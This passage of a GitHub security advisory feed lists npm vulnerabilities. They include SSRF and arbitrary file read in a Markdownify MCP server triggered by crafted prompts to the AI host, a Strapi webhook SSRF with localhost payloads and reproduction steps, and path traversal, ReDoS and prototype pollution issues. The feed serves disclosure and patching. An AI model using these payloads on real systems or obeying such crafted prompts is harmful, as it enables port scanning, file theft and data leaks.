<li><a href="https://github.com/advisories/GHSA-mg2h-6x62-wpwc">https://github.com/advisories/GHSA-mg2h-6x62-wpwc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mg2h-6x62-wpwc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-18T15:02:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-markdownify-server] Markdownify MCP Server allows Server-Side Request Forgery (SSRF) via the Markdownify.get() function]]></title>
        <id>https://github.com/advisories/GHSA-frq9-3hp2-xvxg</id>
        <link href="https://github.com/advisories/GHSA-frq9-3hp2-xvxg"/>
        <updated>2025-05-29T17:27:26.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package mcp-markdownify-server are vulnerable to Server-Side Request Forgery (SSRF) via the Markdownify.get() function. An attacker can craft a prompt that, once accessed by the MCP host, can invoke the webpage-to-markdown, bing-search-to-markdown, and youtube-to-markdown tools to issue requests and read the responses to attacker-controlled URLs, potentially leaking sensitive information.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5276">https://nvd.nist.gov/vuln/detail/CVE-2025-5276</a></li>
<li><a href="https://github.com/zcaceres/markdownify-mcp/commit/0284aa8f34d32c65e20d8cda2d429b7943c9af03">https://github.com/zcaceres/markdownify-mcp/commit/0284aa8f34d32c65e20d8cda2d429b7943c9af03</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-MCPMARKDOWNIFYSERVER-10249387">https://security.snyk.io/vuln/SNYK-JS-MCPMARKDOWNIFYSERVER-10249387</a></li>
<li><a href="https://github.com/zcaceres/markdownify-mcp/blob/224cf89f0d58616d2a5522f60f184e8391d1c9e3/src/server.ts#L20C17-L20C29">https://github.com/zcaceres/markdownify-mcp/blob/224cf89f0d58616d2a5522f60f184e8391d1c9e3/src/server.ts#L20C17-L20C29</a></li>
<li><a href="https://github.com/advisories/GHSA-frq9-3hp2-xvxg">https://github.com/advisories/GHSA-frq9-3hp2-xvxg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-frq9-3hp2-xvxg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-29T06:31:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-markdownify-server] Markdownify MCP Server allows attackers to read arbitrary files]]></title>
        <id>https://github.com/advisories/GHSA-22v8-p7h2-rj7p</id>
        <link href="https://github.com/advisories/GHSA-22v8-p7h2-rj7p"/>
        <updated>2025-05-29T17:27:11.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package mcp-markdownify-server are vulnerable to Files or Directories Accessible to External Parties via the get-markdown-file tool. An attacker can craft a prompt that, once accessed by the MCP host, will allow it to read arbitrary files from the host running the server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5273">https://nvd.nist.gov/vuln/detail/CVE-2025-5273</a></li>
<li><a href="https://github.com/zcaceres/markdownify-mcp/commit/3a6b202d088ef7acb8be84bc09515f41a2b1a9df">https://github.com/zcaceres/markdownify-mcp/commit/3a6b202d088ef7acb8be84bc09515f41a2b1a9df</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-MCPMARKDOWNIFYSERVER-10249193">https://security.snyk.io/vuln/SNYK-JS-MCPMARKDOWNIFYSERVER-10249193</a></li>
<li><a href="https://github.com/zcaceres/markdownify-mcp/blob/3667bd4765c0e49684ce22df268d02dd478a7f3b/src/Markdownify.ts#L94">https://github.com/zcaceres/markdownify-mcp/blob/3667bd4765c0e49684ce22df268d02dd478a7f3b/src/Markdownify.ts#L94</a></li>
<li><a href="https://github.com/advisories/GHSA-22v8-p7h2-rj7p">https://github.com/advisories/GHSA-22v8-p7h2-rj7p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22v8-p7h2-rj7p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-29T06:31:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Information exposure in Next.js dev server due to lack of origin verification]]></title>
        <id>https://github.com/advisories/GHSA-3h52-269p-cp9r</id>
        <link href="https://github.com/advisories/GHSA-3h52-269p-cp9r"/>
        <updated>2025-05-30T15:17:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A low-severity vulnerability in <strong>Next.js</strong> has been fixed in <strong>version 15.2.2</strong>. This issue may have allowed limited source code exposure when the dev server was running with the App Router enabled. The vulnerability only affects local development environments and requires the user to visit a malicious webpage while <code>npm run dev</code> is active.</p>
<p>Learn more: <a href="https://vercel.com/changelog/cve-2025-48068">https://vercel.com/changelog/cve-2025-48068</a></p>
<h2 id="credit">Credit</h2>
<p>Thanks to <a href="https://github.com/sapphi-red">sapphi-red</a> and <a href="https://github.com/R4356th">Radman Siddiki</a> for responsibly disclosing this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-3h52-269p-cp9r">https://github.com/vercel/next.js/security/advisories/GHSA-3h52-269p-cp9r</a></li>
<li><a href="https://vercel.com/changelog/cve-2025-48068">https://vercel.com/changelog/cve-2025-48068</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48068">https://nvd.nist.gov/vuln/detail/CVE-2025-48068</a></li>
<li><a href="https://github.com/advisories/GHSA-3h52-269p-cp9r">https://github.com/advisories/GHSA-3h52-269p-cp9r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3h52-269p-cp9r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-05-28T21:52:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[formidable] Formidable relies on hexoid to prevent guessing of filenames for untrusted executable content]]></title>
        <id>https://github.com/advisories/GHSA-75v8-2h7p-7m2m</id>
        <link href="https://github.com/advisories/GHSA-75v8-2h7p-7m2m"/>
        <updated>2025-05-27T18:49:22.000Z</updated>
        <content type="html"><![CDATA[<p>Formidable (aka node-formidable) 2.x before 2.1.3 and 3.x before 3.5.3 relies on hexoid to prevent guessing of filenames for untrusted executable content; however, hexoid is documented as not "cryptographically secure." (Also, there is a scenario in which only the last two characters of a hexoid string need to be guessed, but this is not often relevant.) NOTE: this does not imply that, in a typical use case, attackers will be able to exploit any hexoid behavior to upload and execute their own content.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46653">https://nvd.nist.gov/vuln/detail/CVE-2025-46653</a></li>
<li><a href="https://github.com/node-formidable/formidable/commit/022c2c5577dfe14d2947f10909d81b03b6070bf5">https://github.com/node-formidable/formidable/commit/022c2c5577dfe14d2947f10909d81b03b6070bf5</a></li>
<li><a href="https://github.com/node-formidable/formidable/blob/d0fbec13edc8add54a1afb9ce1a8d3db803f8d47/CHANGELOG.md?plain=1#L10">https://github.com/node-formidable/formidable/blob/d0fbec13edc8add54a1afb9ce1a8d3db803f8d47/CHANGELOG.md?plain=1#L10</a></li>
<li><a href="https://github.com/zast-ai/vulnerability-reports/blob/main/formidable/file_upload/report.md">https://github.com/zast-ai/vulnerability-reports/blob/main/formidable/file_upload/report.md</a></li>
<li><a href="https://github.com/node-formidable/formidable/commit/37a3e89fca1ed68ec674a539f13aafd62221ddaa">https://github.com/node-formidable/formidable/commit/37a3e89fca1ed68ec674a539f13aafd62221ddaa</a></li>
<li><a href="https://www.npmjs.com/package/formidable/v/2.1.3">https://www.npmjs.com/package/formidable/v/2.1.3</a></li>
<li><a href="https://www.npmjs.com/package/formidable/v/3.5.3">https://www.npmjs.com/package/formidable/v/3.5.3</a></li>
<li><a href="https://github.com/advisories/GHSA-75v8-2h7p-7m2m">https://github.com/advisories/GHSA-75v8-2h7p-7m2m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75v8-2h7p-7m2m</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-26T21:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@supabase/auth-js] auth-js Vulnerable to Insecure Path Routing from Malformed User Input]]></title>
        <id>https://github.com/advisories/GHSA-8r88-6cj9-9fh5</id>
        <link href="https://github.com/advisories/GHSA-8r88-6cj9-9fh5"/>
        <updated>2025-05-28T19:42:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The library functions <code>getUserById</code>, <code>deleteUser</code>, <code>updateUserById</code>, <code>listFactors</code> and <code>deleteFactor</code> did not require the user supplied values to be valid UUIDs. This could lead to a URL path traversal, resulting in the wrong API function being called.</p>
<p>Implementations that follow security best practice and validate user controlled inputs, such as the <code>userId</code> are not affected by this.</p>
<h3 id="patches">Patches</h3>
<p>Strict value checks have been added to all affected functions. These functions now require that the <code>userId</code> and <code>factorId</code> parameters MUST be valid UUID (v4).</p>
<p><strong>Patched version:</strong> &gt;= 2.69.1</p>
<h3 id="workarounds">Workarounds</h3>
<p>Implementations that follow security best practice and validate user controlled inputs, such as the <code>userId</code> are not affected by this. It is recommended that users of the auth-js library always follow security best practice and validate all inputs, before passing these to other functions or libraries.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/supabase/auth-js/pull/1063">https://github.com/supabase/auth-js/pull/1063</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/supabase/auth-js/security/advisories/GHSA-8r88-6cj9-9fh5">https://github.com/supabase/auth-js/security/advisories/GHSA-8r88-6cj9-9fh5</a></li>
<li><a href="https://github.com/supabase/auth-js/pull/1063">https://github.com/supabase/auth-js/pull/1063</a></li>
<li><a href="https://github.com/supabase/auth-js/commit/1bcb76e479e51cd9bca2d7732d0bf3199e07a693">https://github.com/supabase/auth-js/commit/1bcb76e479e51cd9bca2d7732d0bf3199e07a693</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48370">https://nvd.nist.gov/vuln/detail/CVE-2025-48370</a></li>
<li><a href="https://github.com/advisories/GHSA-8r88-6cj9-9fh5">https://github.com/advisories/GHSA-8r88-6cj9-9fh5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8r88-6cj9-9fh5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-05-27T18:00:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/admin] Strapi allows Server-Side Request Forgery in Webhook function]]></title>
        <id>https://github.com/advisories/GHSA-v8wj-f5c7-pvxf</id>
        <link href="https://github.com/advisories/GHSA-v8wj-f5c7-pvxf"/>
        <updated>2025-05-29T21:04:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>In Strapi latest version, at function Settings -&gt; Webhooks, the application allows us to input a URL in order to create a Webook connection. However, we can input into this field the local domains such as <code>localhost</code>, <code>127.0.0.1</code>, <code>0.0.0.0</code>,.... in order to make the Application fetching into the internal itself, which causes the vulnerability <code>Server - Side Request Forgery (SSRF)</code>.</p>
<h2 id="payloads">Payloads</h2>
<ul>
<li><code>http://127.0.0.1:80</code> -&gt; <code>The Port is not open</code></li>
<li><code>http://127.0.0.1:1337</code> -&gt; <code>The Port which Strapi is running on</code></li>
</ul>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ul>
<li>First of all, let's input the URL <code>http://127.0.0.1:80</code> into the <code>URL</code> field, and click "Save".</li>
</ul>
<p><img alt="CleanShot 2024-06-04 at 22 45 17@2x" src="https://github.com/strapi/strapi/assets/71650574/7336b817-cb61-41e6-9b3f-87151d8667e9"></p>
<ul>
<li>Next, use the "Trigger" function and use Burp Suite to capture the request / response</li>
</ul>
<p><img alt="CleanShot 2024-06-04 at 22 47 50@2x" src="https://github.com/strapi/strapi/assets/71650574/659f1bbe-6b03-456c-a9c2-5187fca20dd6"></p>
<ul>
<li>The server return <code>request to http://127.0.0.1/ failed, reason: connect ECONNREFUSED 127.0.0.1:80</code>, BECAUSE the <code>Port 80</code> is not open, since we are running Strapi on <code>Port 1337</code>, let's change the URL we input above into <code>http://127.0.0.1:1337</code></li>
</ul>
<p><img alt="CleanShot 2024-06-04 at 22 50 13@2x" src="https://github.com/strapi/strapi/assets/71650574/a7916c86-1923-49ed-bd43-a70fa00d41e9"></p>
<ul>
<li>Continue to click the "Trigger" function, use Burp to capture the request / response</li>
</ul>
<p><img alt="CleanShot 2024-06-04 at 22 53 25@2x" src="https://github.com/strapi/strapi/assets/71650574/6fc51bb7-5a66-4b2b-b24f-2eba45ba1db9"></p>
<ul>
<li>The server returns <code>Method Not Allowed</code>, which means that there actually is a <code>Port 1337</code> running the machine.</li>
</ul>
<h2 id="poc">PoC</h2>
<p>Here is the Poc Video, please check: </p>
<p><a href="https://drive.google.com/file/d/1EvVp9lMpYnGLmUyr16gQ_2RetI-GqYjV/view?usp=sharing">https://drive.google.com/file/d/1EvVp9lMpYnGLmUyr16gQ_2RetI-GqYjV/view?usp=sharing</a></p>
<h2 id="impact">Impact</h2>
<ul>
<li>If there is a real server running Strapi with many ports open, by using this SSRF vulnerability, the attacker can brute-force through all 65535 ports to know what ports are open.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-v8wj-f5c7-pvxf">https://github.com/strapi/strapi/security/advisories/GHSA-v8wj-f5c7-pvxf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52588">https://nvd.nist.gov/vuln/detail/CVE-2024-52588</a></li>
<li><a href="https://github.com/advisories/GHSA-v8wj-f5c7-pvxf">https://github.com/advisories/GHSA-v8wj-f5c7-pvxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8wj-f5c7-pvxf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-27T17:59:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[marked] Marked allows Regular Expression Denial of Service (ReDoS) attacks]]></title>
        <id>https://github.com/advisories/GHSA-p9wx-2529-fp83</id>
        <link href="https://github.com/advisories/GHSA-p9wx-2529-fp83"/>
        <updated>2025-05-27T15:03:48.000Z</updated>
        <content type="html"><![CDATA[<p>Marked prior to version 0.3.17 is vulnerable to a Regular Expression Denial of Service (ReDoS) attack due to catastrophic backtracking in several regular expressions used for parsing HTML tags and markdown links. An attacker can exploit this vulnerability by providing specially crafted markdown input, such as deeply nested or repetitively structured brackets or tag attributes, which cause the parser to hang and lead to a Denial of Service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-25110">https://nvd.nist.gov/vuln/detail/CVE-2018-25110</a></li>
<li><a href="https://github.com/markedjs/marked/issues/1070">https://github.com/markedjs/marked/issues/1070</a></li>
<li><a href="https://github.com/markedjs/marked/pull/1083">https://github.com/markedjs/marked/pull/1083</a></li>
<li><a href="https://github.com/markedjs/marked/commit/20bfc106013ed45713a21672ad4a34df94dcd485">https://github.com/markedjs/marked/commit/20bfc106013ed45713a21672ad4a34df94dcd485</a></li>
<li><a href="https://github.com/Checkmarx/Vulnerabilities-Proofs-of-Concept/tree/main/2018/CVE-2018-25110">https://github.com/Checkmarx/Vulnerabilities-Proofs-of-Concept/tree/main/2018/CVE-2018-25110</a></li>
<li><a href="https://github.com/advisories/GHSA-p9wx-2529-fp83">https://github.com/advisories/GHSA-p9wx-2529-fp83</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p9wx-2529-fp83</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-23T15:31:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[radashi] radashi Allows Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')]]></title>
        <id>https://github.com/advisories/GHSA-2xv9-ghh9-xc69</id>
        <link href="https://github.com/advisories/GHSA-2xv9-ghh9-xc69"/>
        <updated>2025-05-27T15:03:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This is a prototype pollution vulnerability. It impacts users of the <code>set</code> function within the Radashi library. If an attacker can control parts of the <code>path</code> argument to the <code>set</code> function, they could potentially modify the prototype of all objects in the JavaScript runtime, leading to unexpected behavior, denial of service, or even remote code execution in some specific scenarios.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in commit <a href="https://github.com/radashi-org/radashi/commit/8147abc8cfc3cfe9b9a17cd389076a5d97235a66"><code>8147abc8cfc3cfe9b9a17cd389076a5d97235a66</code></a>. Users should upgrade to a version of Radashi that includes this commit. The fix utilizes a new helper function, <code>isDangerousKey</code>, to prevent the use of <code>__proto__</code>, <code>prototype</code>, or <code>constructor</code> as keys in the path, throwing an error if any are encountered. This check is bypassed for objects with a <code>null</code> prototype.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users on older versions can mitigate this vulnerability by sanitizing the <code>path</code> argument provided to the <code>set</code> function to ensure that no part of the path string is <code>__proto__</code>, <code>prototype</code>, or <code>constructor</code>. For example, by checking each segment of the path before passing it to the <code>set</code> function.</p>
<h3 id="references">References</h3>
<ul>
<li>Git commit: <a href="https://github.com/radashi-org/radashi/commit/8147abc8cfc3cfe9b9a17cd389076a5d97235a66"><code>8147abc8cfc3cfe9b9a17cd389076a5d97235a66</code></a></li>
<li>CWE-1321: Improperly Controlled Modification of Dynamically-Determined Object Attributes ('Prototype Pollution'): <a href="https://cwe.mitre.org/data/definitions/1321.html">https://cwe.mitre.org/data/definitions/1321.html</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/radashi-org/radashi/security/advisories/GHSA-2xv9-ghh9-xc69">https://github.com/radashi-org/radashi/security/advisories/GHSA-2xv9-ghh9-xc69</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48054">https://nvd.nist.gov/vuln/detail/CVE-2025-48054</a></li>
<li><a href="https://github.com/radashi-org/radashi/commit/8147abc8cfc3cfe9b9a17cd389076a5d97235a66">https://github.com/radashi-org/radashi/commit/8147abc8cfc3cfe9b9a17cd389076a5d97235a66</a></li>
<li><a href="https://github.com/advisories/GHSA-2xv9-ghh9-xc69">https://github.com/advisories/GHSA-2xv9-ghh9-xc69</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2xv9-ghh9-xc69</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-27T15:03:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[connect-multiparty] Connect-Multiparty allows arbitrary file upload]]></title>
        <id>https://github.com/advisories/GHSA-w2xw-44r3-4v9g</id>
        <link href="https://github.com/advisories/GHSA-w2xw-44r3-4v9g"/>
        <updated>2025-05-20T19:40:43.000Z</updated>
        <content type="html"><![CDATA[<p>An arbitrary file upload vulnerability in the file upload module of Express Connect-Multiparty 2.2.0 allows attackers to execute arbitrary code via a crafted PDF file. NOTE: the Supplier has not verified this vulnerability report.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29623">https://nvd.nist.gov/vuln/detail/CVE-2022-29623</a></li>
<li><a href="https://www.youtube.com/watch?v=i3xJR-91rrM">https://www.youtube.com/watch?v=i3xJR-91rrM</a></li>
<li><a href="https://github.com/expressjs/connect-multiparty/releases/tag/2.2.0">https://github.com/expressjs/connect-multiparty/releases/tag/2.2.0</a></li>
<li><a href="https://www.npmjs.com/package/connect-multiparty">https://www.npmjs.com/package/connect-multiparty</a></li>
<li><a href="https://github.com/advisories/GHSA-w2xw-44r3-4v9g">https://github.com/advisories/GHSA-w2xw-44r3-4v9g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w2xw-44r3-4v9g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-17T00:01:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tar-fs] tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File]]></title>
        <id>https://github.com/advisories/GHSA-pq67-2wwv-3xjx</id>
        <link href="https://github.com/advisories/GHSA-pq67-2wwv-3xjx"/>
        <updated>2025-05-20T17:57:27.000Z</updated>
        <content type="html"><![CDATA[<p>An Improper Link Resolution Before File Access ("Link Following") and Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.</p>
<p>This issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12905">https://nvd.nist.gov/vuln/detail/CVE-2024-12905</a></li>
<li><a href="https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed">https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed</a></li>
<li><a href="https://github.com/advisories/GHSA-pq67-2wwv-3xjx">https://github.com/advisories/GHSA-pq67-2wwv-3xjx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pq67-2wwv-3xjx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-27T18:31:28.000Z</published>
    </entry>
</feed>